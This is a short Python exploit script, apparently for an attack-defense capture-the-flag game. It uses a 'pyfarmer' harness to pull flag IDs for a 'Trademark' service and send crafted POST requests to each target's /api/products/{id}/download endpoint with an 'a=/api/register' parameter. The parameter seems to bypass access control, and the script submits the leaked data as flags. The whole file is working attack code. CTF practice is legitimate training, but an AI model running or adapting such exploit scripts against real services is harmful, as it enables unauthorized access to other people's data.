import requests
from pyfarmer import farm, submit_flag, get_ids, print_exception


def main(ip: str) -> None:
    for flag_id in get_ids("http://10.10.0.1:8081/flagIds", "Trademark"):
        try:
            r = requests.post(
                f"http://{ip}:5000/api/products/{flag_id}/download?a=/api/register"
            )
            submit_flag(r.text)
        except:
            print_exception()


if __name__ == "__main__":
    farm(main, __file__)
